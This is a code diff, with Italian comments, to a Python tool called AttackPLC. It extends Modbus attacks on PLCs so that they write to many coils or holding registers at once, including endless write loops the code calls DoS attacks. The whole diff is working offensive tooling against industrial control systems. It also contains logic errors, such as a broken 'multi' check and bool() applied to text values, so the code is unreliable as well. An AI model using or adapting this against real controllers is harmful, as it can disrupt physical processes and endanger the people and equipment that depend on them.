@@ -386,12 +386,16 @@ class AttackPLC:
     Il metodo ritorna il tipo di registro ("coil" o "register", l'indirizzo Modbus del registro e il valore da
     scrivere
     """
-    def select_register(self):
+    def select_register(self, multi='single'):
         reg_type = None
         modbus_addr = None
         value = None
+        values = []
 
-        choice = input("Select register: ")
+        if not multi == 'multi':
+            choice = input("Select register: ")
+        else:
+            choice = input("Select starting register: ")
 
         # Distinguo il tipo di registro in base alle sue caratteristiche: se è un registro binario
         # (%QX) allora il tipo di registro sarà una coil; se invece è un word register (o come si chiama %QW)
@@ -408,7 +412,14 @@ class AttackPLC:
             # (es: %QX99.1 => 99*8 + 1 = 793)
             modbus_addr = addr + register
 
-            value = input("Enter new value [True/False]: ")
+            if not multi == 'multi':
+                value = input("Enter new value [True/False]: ")
+            else:
+                value = input("Enter new values separated by commas [True/False]: ")
+                value = value.split(',')
+
+                for coil_val in value:
+                    values.append(bool(coil_val))
 
         elif choice[2] == "W" or choice[2] == "w":
             reg_type = "register"
@@ -416,9 +427,20 @@ class AttackPLC:
             # Per gli holding registers, invece, siamo già a posto così e non serve la
             # conversione in decimale
             modbus_addr = int(choice.split(choice[2])[1])
-            value = input("Enter new value: ")
 
-        return reg_type, modbus_addr, value
+            if not multi == 'multi':
+                value = input("Enter new value: ")
+            else:
+                value = input("Enter new values separated by commas: ")
+                value = value.split(',')
+
+                for reg_val in value:
+                    values.append(int(reg_val))
+
+        if not multi == 'multi':
+            return reg_type, modbus_addr, value
+        else:
+            return reg_type, modbus_addr, values
 
     """
     Metodo che effettua l'attacco DoS su un registro. Dato che l'attacco DoS va in un thread, devo
@@ -427,10 +449,11 @@ class AttackPLC:
     Parametri;
     - plc: PLC da attaccare
     - reg_type: tipo di registro (holding/coil)
+    - multi: se 'single', DoS su singolo registro; se 'multi', DoS su più registri contemporaneamente
     - modbus_addr: indirizzo su cui effettuare il DoS
     - value: valore da scrivere sul regisstro
     """
-    def dos_attack(self, plc, reg_type, modbus_addr, value):
+    def dos_attack(self, plc, reg_type, multi, modbus_addr, value):
         try:
             mb = ModbusClient(plc, 502)
             mb.connect()
@@ -444,16 +467,30 @@ class AttackPLC:
             addr = int(addr)
             register = modbus_addr % 8
 
-            print(f"DoS attack on {self.bcolors.OKRED}%QX{addr}.{register}{self.bcolors.ENDC}")
+            if not multi == 'multi':
+                print(f"DoS attack on {self.bcolors.OKRED}%QX{addr}.{register}{self.bcolors.ENDC}")
+            else:
+                print(f"DoS attack from {self.bcolors.OKRED}%QX{addr}.{register}{self.bcolors.ENDC} "
+                      f"to {self.bcolors.OKRED}%QX{addr}.{register + len(value)}{self.bcolors.ENDC}")
 
             while True:
-                mb.write_single_coil(int(modbus_addr), bool(value))
+                if not multi == 'multi':
+                    mb.write_single_coil(int(modbus_addr), bool(value))
+                else:
+                    mb.write_multiple_coils(int(modbus_addr), value)
 
         elif reg_type == "register":
-            print(f"DoS attack on {self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC}")
+            if not multi == 'multi':
+                print(f"DoS attack on {self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC}")
+            else:
+                print(f"DoS attack from {self.bcolors.OKBLUE}%QW{modbus_addr}{self.bcolors.ENDC} "
+                      f"to {self.bcolors.OKBLUE}%QW{modbus_addr + len(value)}{self.bcolors.ENDC}")
 
             while True:
-                mb.write_single_register(int(modbus_addr), int(value))
+                if not multi == 'multi':
+                    mb.write_single_register(int(modbus_addr), int(value))
+                else:
+                    mb.write_multiple_registers(int(modbus_addr), value)
 
         mb.close()
 
@@ -463,17 +500,22 @@ class AttackPLC:
     Parametri: 
     - plc: PLC da attaccare
     - reg_type: tipo di registro da attaccare
+    - multi: se 'single', attacco su singolo registro; se 'multi', attacco su più registri contemporaneamente
     - modbus_addr: indirizzo del registro
     - value: valore da scrivere sul registro
     - loop: indica se l'attacco sul registro è continuo (DoS) o singolo
     """
-    def make_attack(self, plc, reg_type, modbus_addr, value, loop):
+    def make_attack(self, plc, reg_type, multi, modbus_addr, value, loop):
         if reg_type == 'coil':
 
             # Se l'utente ha chiesto esplicitamente di eseguire il DoS sul registro, lancia un nuovo thread
             # con l'attacco, altrimenti fai una normale scrittura singola
             if loop == "Y" or loop == "y":
-                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), bool(value)))
+                if not multi == 'multi':
+                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'single', int(modbus_addr), bool(value)))
+                else:
+                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'multi', int(modbus_addr), value))
+
                 thr1.start()
             else:
                 # Ho messo due volte il try-catch invece di una volta sola perchè già self.dos_attack() fa una
@@ -486,13 +528,20 @@ class AttackPLC:
                     print(f"Connection to {plc} failed. Exiting")
                     return
 
-                mb.write_single_coil(modbus_addr, bool(value))
+                if not multi == 'multi':
+                    mb.write_single_coil(modbus_addr, bool(value))
+                else:
+                    mb.write_multiple_coils(modbus_addr, value)
 
                 mb.close()
 
         elif reg_type == "register":
             if loop == "Y" or loop == "y":
-                thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, int(modbus_addr), int(value)))
+                if not multi == 'multi':
+                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'single', int(modbus_addr), int(value)))
+                else:
+                    thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, 'multi', int(modbus_addr), value))
+
                 thr1.start()
             else:
                 # Vedi analogo caso nel primo if
@@ -503,7 +552,10 @@ class AttackPLC:
                     print(f"Connection to {plc} failed. Exiting")
                     return
 
-                mb.write_single_register(int(modbus_addr), int(value))
+                if not multi == 'multi':
+                    mb.write_single_register(int(modbus_addr), int(value))
+                else:
+                    mb.write_multiple_registers(int(modbus_addr), value)
 
                 mb.close()
 
@@ -551,8 +603,13 @@ class AttackPLC:
 
             print("\n")
 
-            # Chiedi all'utente quale registro vuole attaccare e chiedi se vuole effettuare un DoS
-            reg_type, modbus_addr, value = self.select_register()
+            # Chiedi all'utente quale/i registro/i vuole attaccare e chiedi se vuole effettuare un DoS
+            multi = input ("Perform a multiple address attack? [y/n] ")
+
+            if multi == "y" or multi == "Y":
+                reg_type, modbus_addr, value = self.select_register('multi')
+            else:
+                reg_type, modbus_addr, value = self.select_register('single')
 
             loop = input("Do you want to perform a DoS on the register? [y/n] ")
 
@@ -563,7 +620,10 @@ class AttackPLC:
                 print(f"Connecting to {plc}")
 
                 # Porta l'attacco vero e proprio
-                self.make_attack(plc, reg_type, modbus_addr, value, loop)
+                if not multi == 'y' or multi == 'Y':
+                    self.make_attack(plc, reg_type, 'single', modbus_addr, value, loop)
+                else:
+                    self.make_attack(plc, reg_type, 'multi', modbus_addr, value, loop)
 
         else:
             plc = None
@@ -625,10 +685,19 @@ class AttackPLC:
 
             print("\n")
 
-            reg_type, modbus_addr, value = self.select_register()
+            multi = input("Perform a multiple address attack? [y/n] ")
+
+            if multi == "y" or multi == "Y":
+                reg_type, modbus_addr, value = self.select_register('multi')
+            else:
+                reg_type, modbus_addr, value = self.select_register('single')
+
             loop = input("Do you want to perform a DoS on the register? [y/n]: ")
 
-            self.make_attack(plc, reg_type, modbus_addr, value, loop)
+            if not multi == 'y' or multi == 'Y':
+                self.make_attack(plc, reg_type, 'single', modbus_addr, value, loop)
+            else:
+                self.make_attack(plc, reg_type, 'multi', modbus_addr, value, loop)
 
         time.sleep(1)  # Altrimenti mi sballa la stampa in caso di thread
         print("\n")
